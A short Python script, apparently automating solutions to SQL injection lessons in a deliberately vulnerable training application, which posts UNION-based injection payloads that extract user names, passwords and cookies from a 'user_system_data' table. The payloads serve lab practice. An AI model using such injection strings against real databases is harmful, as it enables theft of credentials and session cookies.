# coding:utf-8
from wg_auto.base import request_wrap


def sql3a_test():
    __url = '/SqlInjectionAdvanced/attack6a'
    return request_wrap(method='post', url=__url,
                        data={"userid_6a": "1' union select userid,user_name,user_name,cookie,password,user_name,userid from user_system_data;--"})


def sql3b_test():
    __url = '/SqlInjectionAdvanced/attack6b'
    return request_wrap(method='post', url=__url,
                        data={"userid_6b": "1' union select userid,user_name,user_name,cookie,password,user_name,userid from user_system_data;--"})


def sql5_test():
    # TODO 注册 tom 和 登录
    __url = "/SqlInjectionAdvanced/challenge_Login"
    return request_wrap(method='post', url=__url,
                        data={"username_login": "", "password_login": ""})